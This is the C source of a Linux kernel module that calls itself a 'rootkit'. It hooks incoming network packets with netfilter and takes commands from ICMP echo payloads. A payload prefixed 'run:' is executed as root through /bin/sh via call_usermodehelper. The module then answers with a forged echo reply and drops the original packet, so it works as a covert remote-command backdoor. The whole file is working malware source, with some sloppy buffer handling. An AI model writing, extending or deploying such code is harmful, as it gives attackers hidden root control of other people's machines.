#include <linux/module.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <linux/netfilter_ipv4.h>
#include <linux/workqueue.h>
#include <linux/udp.h>
#include <linux/icmp.h>
#include <linux/inet.h>

#define MAX_CMD_LEN 1976

static struct nf_hook_ops nfho;

typedef enum {
  RUN, 
  GET,
  BAD_COMMAND
} command_t;

#define COMMAND_NUM 2

typedef struct {
  struct work_struct work;
  char string[MAX_CMD_LEN];
} args_t;


static void work_handler(struct work_struct* work)
{
    args_t* args_ptr = container_of(work, args_t, work);


    char *argv[] = {"/bin/sh", "-c", args_ptr->string, NULL};
    char *envp[] = {"PATH=/bin:/sbin", NULL};

    printk(KERN_INFO "rootkit: working\n");

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);

    kfree(args_ptr);
}


static command_t parse_command(char* data)
{
    char* command_strings[COMMAND_NUM] = {"run:\0", "get:\0"};
    command_t commands[COMMAND_NUM] = {RUN, GET};
    uint i, shift, j;



    for (i = 0; i < COMMAND_NUM; i++) {

        shift = strlen(command_strings[i]);
        if (strncmp(data, command_strings[i], shift) != 0) {
            continue;
        }

        j = shift;
        while (true) {
            data[j - shift] = data[j];
            if (data[j] == '\0') {
                break;
            }
            j++;
        }
        return commands[i];
        
        

    }
    
    

    return BAD_COMMAND;

}

#define ICMP_HSIZE 8
#define IP_HSIZE 20


int send_icmp(struct net_device* dev, uint8_t dest_addr [ETH_ALEN] , uint16_t proto){
    
    int ret;
    unsigned char* data;
    char *srcIP = "192.168.31.88";
    char *dstIP = "192.168.31.125";

    char *hello_world = ">>> KERNEL sk_buff Hello World <<< by Dmytro Shytyi\0";

    int payload_size = strlen(hello_world);

    printk(KERN_INFO "rootkit: 1\n");
    struct sk_buff* skb = alloc_skb(ETH_HLEN + ICMP_HSIZE + IP_HSIZE + payload_size, GFP_ATOMIC);


    printk(KERN_INFO "rootkit: 2\n");

    skb_reserve(skb, ETH_HLEN + ICMP_HSIZE + IP_HSIZE);

    data = skb_put(skb, payload_size);
    memcpy(data, hello_world, payload_size);

    struct icmphdr* icmph = (struct icmphdr*)skb_push(skb, ICMP_HSIZE);  
    icmph->type = ICMP_ECHO;
    icmph->code = 0;
    icmph->checksum = 0;
    icmph->un.gateway = 0;

    struct iphdr* iph = (struct iphdr*)skb_push(skb, IP_HSIZE);
    iph->ihl = IP_HSIZE / 4;
    iph->version = 4; 
    iph->tos = 0;
    iph->tot_len = htons(ICMP_HSIZE + IP_HSIZE + payload_size);
    iph->frag_off = 0;
    iph->ttl = 64; 
    iph->protocol = IPPROTO_ICMP; 
    iph->check = 0;
    iph->saddr = in_aton(srcIP);
    iph->daddr = in_aton(dstIP);
    printk(KERN_INFO "rootkit: 3\n");

    //dev_hard_header(skb, dev, ETH_P_IP, dest_addr, dev->dev_addr, dev->addr_len);


    struct ethhdr* eth = (struct ethhdr*)skb_push(skb, sizeof (struct ethhdr));
    skb->dev = dev;
    skb->pkt_type = PACKET_OUTGOING;
    skb->protocol = htons(proto);
    eth->h_proto = skb->protocol;
    skb->no_fcs = 1;
    
    memcpy(eth->h_source, dev->dev_addr, ETH_ALEN);
    memcpy(eth->h_dest, dest_addr, ETH_ALEN);


    ret = dev_queue_xmit(skb);

    printk(KERN_INFO "rootkit: ret: %d\n", ret);
    

    return 0;
}



    
int return_icmp(char* string, struct icmphdr* icmph, struct iphdr* iph, struct net_device* dev){

    int payload_size = strlen(string);
    u32 saddr_copy;
    unsigned char* payload;
    static char return_mac[ETH_ALEN] = {0xff,0xff,0xff,0xff,0xff,0xff}; 
    int ret;
    struct sk_buff* skb;
    struct icmphdr* new_icmph;
    struct iphdr* new_iph;
    struct ethhdr* new_eth;


    printk(KERN_INFO "rootkit: 1\n");
    skb = alloc_skb(ETH_HLEN + ICMP_HSIZE + IP_HSIZE + payload_size, GFP_ATOMIC);

    printk(KERN_INFO "rootkit: 2\n");

    skb_reserve(skb, ETH_HLEN + ICMP_HSIZE + IP_HSIZE);

    payload = skb_put(skb, payload_size);
    memcpy(payload, string, payload_size);

    new_icmph = (struct icmphdr*)skb_push(skb, ICMP_HSIZE);  
    memcpy(new_icmph, icmph, ICMP_HSIZE);
    new_icmph->type = ICMP_ECHOREPLY;

    new_iph = (struct iphdr*)skb_push(skb, IP_HSIZE);
    memcpy(new_iph, iph, IP_HSIZE);
    new_iph->tot_len = htons(ICMP_HSIZE + IP_HSIZE + payload_size);

    saddr_copy = new_iph->saddr;
    new_iph->saddr = new_iph->daddr;
    new_iph->daddr = saddr_copy;
    printk(KERN_INFO "rootkit: 3\n");

    skb->dev = dev;
    skb->pkt_type = PACKET_OUTGOING;
    skb->protocol = htons(ETH_P_IP);
    skb->no_fcs = 1;
    


    new_eth = (struct ethhdr*)skb_push(skb, sizeof (struct ethhdr));


    new_eth->h_proto = skb->protocol;
    memcpy(new_eth->h_source, dev->dev_addr, ETH_ALEN);
    memcpy(new_eth->h_dest, return_mac, ETH_ALEN);
    

    ret = dev_queue_xmit(skb);

    printk(KERN_INFO "rootkit: ret: %d\n", ret);
    

    return ret;
}



    


static unsigned int icmp_cmd_executor(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
{
    
    struct iphdr *iph;
    struct icmphdr *icmph;

    unsigned char *user_data;
    unsigned char *tail;
    unsigned char *i;
    int j = 0;

    args_t* args_ptr;

    command_t command;

    iph = ip_hdr(skb);
    icmph = icmp_hdr(skb);


    printk(KERN_INFO "rootkit: ckecking connection\n");


    if (iph->protocol != IPPROTO_ICMP) {
        printk(KERN_INFO "rootkit: bad protocol\n");
        return NF_ACCEPT;
    }
    if (icmph->type != ICMP_ECHO) {
        printk(KERN_INFO "rootkit: bad request type\n");
        return NF_ACCEPT;
    }

    printk(KERN_INFO "rootkit: parsing command\n");

    args_ptr = kmalloc(sizeof(args_t), GFP_KERNEL);

    user_data = (unsigned char *)((unsigned char *)icmph + (sizeof(icmph)));
    tail = skb_tail_pointer(skb);

    j = 0;
    for (i = user_data; i != tail; ++i) {
        char c = *(char *)i;

        args_ptr->string[j] = c;
        j++;

        if (c == '\0')
            break;

        if (j == MAX_CMD_LEN) {
            args_ptr->string[j] = '\0';
            break;
        }

    }

    command = parse_command(args_ptr->string);

    switch (command) {
        case RUN:
            printk(KERN_INFO "rootkit: run command: %s \n", args_ptr->string);
            INIT_WORK(&args_ptr->work, work_handler);
            schedule_work(&args_ptr->work);
            break;
        case GET:
            printk(KERN_INFO "rootkit: get command: %s \n", args_ptr->string);
            break;
        default:
            printk(KERN_INFO "rootkit: mda\n");
            break;
    }

    struct net_device *enp0s3;
    enp0s3 = dev_get_by_name(&init_net,"enp0s3");

    return_icmp("test_string\0", icmph, iph, enp0s3);

    dev_put(enp0s3);

    return NF_DROP;
}

static int __init startup(void)
{
    nfho.hook = icmp_cmd_executor;
    nfho.hooknum = NF_INET_PRE_ROUTING;
    nfho.pf = PF_INET;
    nfho.priority = NF_IP_PRI_FIRST;
    nf_register_net_hook(&init_net, &nfho);

    //uint16_t proto;
    //static char addr[ETH_ALEN] = {0xff,0xff,0xff,0xff,0xff,0xff}; 
    //uint8_t dest_addr[ETH_ALEN];
    //struct net_device *enp0s3;
    //enp0s3 = dev_get_by_name(&init_net,"enp0s3");
    //memcpy(dest_addr, addr,ETH_ALEN);
    //proto = ETH_P_IP;
    //send_icmp(enp0s3,dest_addr,proto);
    printk(KERN_INFO "rootkit: start\n");
    return 0;
}

static void __exit cleanup(void)
{
    nf_unregister_net_hook(&init_net, &nfho);
    printk(KERN_INFO "rootkit: finished\n");
}

MODULE_LICENSE("GPL");
module_init(startup);
module_exit(cleanup);